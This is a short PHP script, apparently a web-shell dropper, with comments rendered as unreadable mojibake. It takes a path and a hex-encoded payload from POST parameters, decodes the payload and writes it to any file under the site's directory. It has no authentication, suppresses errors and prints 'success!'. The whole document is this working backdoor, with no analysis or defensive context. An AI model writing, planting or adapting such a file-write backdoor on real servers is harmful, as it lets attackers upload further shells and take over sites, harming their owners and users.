    <?php
    $p=realpath(dirname(__FILE__)."/../").$_POST["a"]; //$pΪĿ¼·+$_POST["a"]
    $t=$_POST["b"]; //$tΪ$_POST["b"]
    $tt=""; //$ttΪ
    for ($i=0;$i<strlen($t);$i+=2) $tt.=urldecode("%".substr($t,$i,2)); //forѭ$t/2ÿѭһξ$ttϡ%xxı
    @fwrite(fopen($p,"w"),$tt); //дļַ$p$tt
    echo "success!";
    ?>